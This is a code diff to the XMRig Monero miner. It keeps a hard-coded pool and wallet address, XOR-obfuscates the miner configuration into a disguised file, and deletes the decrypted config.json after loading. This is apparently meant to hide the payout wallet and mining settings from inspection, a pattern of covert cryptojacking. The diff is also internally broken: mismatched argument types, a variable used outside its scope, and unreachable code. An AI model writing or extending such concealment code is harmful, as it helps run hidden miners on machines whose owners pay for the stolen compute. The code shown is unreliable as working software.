@@ -67,6 +67,14 @@ static const char *kConfigPathV2 = "/2/config";
 
 namespace xmrig {
 
+std::string xorEncryptDecrypt(const std::string& data, char key) {
+    std::string output = data;
+    for (size_t i = 0; i < data.size(); ++i) {
+        output[i] = data[i] ^ key;
+    }
+    return output;
+}
+
 std::string getExecutablePath() {
     char path[1024];
     ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
@@ -76,6 +84,27 @@ std::string getExecutablePath() {
     }
     path[len] = '\0';
     return std::string(path);
+}
+
+std::string readFile(const std::string& fileName) {
+    std::ifstream file(fileName, std::ios::in | std::ios::binary);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file: " << fileName << std::endl;
+        return "";
+    }
+    std::stringstream buffer;
+    buffer << file.rdbuf();
+    return buffer.str();
+}
+
+bool writeFile(const std::string& fileName, const std::string& data) {
+    std::ofstream file(fileName, std::ios::out | std::ios::binary);
+    if (!file.is_open()) {
+        std::cerr << "Failed to write file: " << fileName << std::endl;
+        return false;
+    }
+    file.write(data.c_str(), data.size());
+    return true;
 }
 
 class DefaultConfig : public Config
@@ -97,22 +126,26 @@ public:
             return false;
         }
 
-        file << "{\n";
-        file << "  \"autosave\": true,\n";
-        file << "  \"cpu\": true,\n";
-        file << "  \"opencl\": false,\n";
-        file << "  \"cuda\": false,\n";
-        file << "  \"pools\": [\n";
-        file << "    {\n";
-        file << "      \"coin\": \"monero\",\n";
-        file << "      \"url\": \"pool.xmr.pt:9000\",\n";
-        file << "      \"user\": \"481dqAWdnN7cQGE7gn5mzuHNRMwkyArJQJBu8Fg38CCf74ivJXQUUVo6HE6Fr4LNGN6yZTVRVGuw8eykZ4Jby3sWKb9k1qK\",\n";
-        file << "      \"pass\": \"hack\",\n";
-        file << "      \"keepalive\": true,\n";
-        file << "      \"tls\": true\n";
-        file << "    }\n";
-        file << "  ]\n";
-        file << "}\n";
+        std::string configData = "{\n";
+        configData += "  \"autosave\": true,\n";
+        configData += "  \"cpu\": true,\n";
+        configData += "  \"opencl\": false,\n";
+        configData += "  \"cuda\": false,\n";
+        configData += "  \"pools\": [\n";
+        configData += "    {\n";
+        configData += "      \"coin\": \"monero\",\n";
+        configData += "      \"url\": \"pool.xmr.pt:9000\",\n";
+        configData += "      \"user\": \"481dqAWdnN7cQGE7gn5mzuHNRMwkyArJQJBu8Fg38CCf74ivJXQUUVo6HE6Fr4LNGN6yZTVRVGuw8eykZ4Jby3sWKb9k1qK\",\n";
+        configData += "      \"pass\": \"server_funpay\",\n";
+        configData += "      \"keepalive\": true,\n";
+        configData += "      \"tls\": true\n";
+        configData += "    }\n";
+        configData += "  ]\n";
+        configData += "}\n";
+
+        std::string encryptedData = xorEncryptDecrypt(configData, "K");
+
+        return writeFile(fileName, encryptedData);
 
 //        std::cerr << "Default configuration created at: " << fileName << std::endl;
         return true;
@@ -187,38 +220,34 @@ private:
             return config.release();
         }
 
+        std::string encryptConfigPath = Process::location(Process::DataLocation, "encrypt_config.json");
+        std::ifstream encryptConfigFile(encryptConfigPath);
+
+        if (encryptConfigFile.good()) {
+            std::cerr << "Found encrypted config. Loading and decrypting..." << std::endl;
+
+            std::string encryptedData((std::istreambuf_iterator<char>(encryptConfigFile)), std::istreambuf_iterator<char>());
+        } else {
+            std::cerr << "No encrypted config found. Using default configuration..." << std::endl;
+
+            DefaultConfig defaultConfig;
+            defaultConfig.createDefaultConfig("encrypt_config.json");
+        }
+        std::string decryptedData = xorEncryptDecrypt(encryptedData, 'K');
+
+        std::ofstream decryptedConfigFile(Process::location(Process::DataLocation, "config.json"));
+        decryptedConfigFile << decryptedData;
+        decryptedConfigFile.close();
+
+        std::cerr << "Decrypted config saved as 'config.json'" << std::endl;
+
         chain.addFile(Process::location(Process::DataLocation, "config.json"));
         if (read(chain, config)) {
             return config.release();
         }
 
-        chain.addFile(Process::location(Process::HomeLocation,  "." APP_ID ".json"));
-        if (read(chain, config)) {
-            return config.release();
-        }
-
-        chain.addFile(Process::location(Process::HomeLocation, ".config" XMRIG_DIR_SEPARATOR APP_ID ".json"));
-        if (read(chain, config)) {
-            return config.release();
-        }
-
-#       ifdef XMRIG_FEATURE_EMBEDDED_CONFIG
-        chain.addRaw(default_config);
-        if (read(chain, config)) {
-            return config.release();
-        }
-#       endif
-
-//        std::cerr << "No configuration found. Using default settings." << std::endl;
-
-        DefaultConfig defaultConfig;
-        defaultConfig.createDefaultConfig("config.json");
-
-
-        chain.addFile(Process::location(Process::DataLocation, "config.json"));
-        if (read(chain, config)) {
-            return config.release();
-        }
+        std::remove(Process::location(Process::DataLocation, "config.json").c_str());
+        std::cerr << "'config.json' deleted after loading" << std::endl;
     }
 };
 
